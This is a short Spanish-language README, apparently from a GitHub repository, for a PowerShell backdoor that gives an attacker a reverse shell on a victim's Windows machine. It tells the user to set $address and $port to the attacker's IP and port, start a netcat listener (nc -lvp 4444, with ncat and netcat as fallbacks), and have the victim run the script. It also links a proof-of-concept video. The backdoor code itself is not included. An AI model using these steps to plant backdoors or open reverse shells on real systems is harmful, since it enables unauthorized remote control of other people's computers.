# powershell-backdoor
Backdoor en Powershell para obtener una reverse shell

Uso:
Primero que nada antes de ejecutar el backdoor debemos de modificar ciertos parametros en el archivo Backdoor.ps1, las variables $address y $port hay que modificarlas, en $address hay que colocar la IP de la maquina atacante, y en $port hay que colocar el puerto por el cual se hara la conexion, y por el que el atacante estara a la escucha.

$address = 'LA DIRECCION IP DEL ATACANTE'

$port = 'EL PUERTO POR EL QUE SE VA A REALIZAR LA CONEXION'

Luego el atacante va a estar a la escucha de una conexion por medio de netcat

nc -lvp "el puerto que se haya colocado"

Ejemplo:

nc -lvp 4444

O si no funciona puedes probar alguno de estos dos:

ncat -lvp 4444

netcat -lvp 4444

Y la victima va a ejecutar el backdoor en su maquina windows

PoC Backdoor Powershell:

https://user-images.githubusercontent.com/64616891/128221817-3fb9306b-8056-4839-b087-a22ff2e1d8e9.mp4
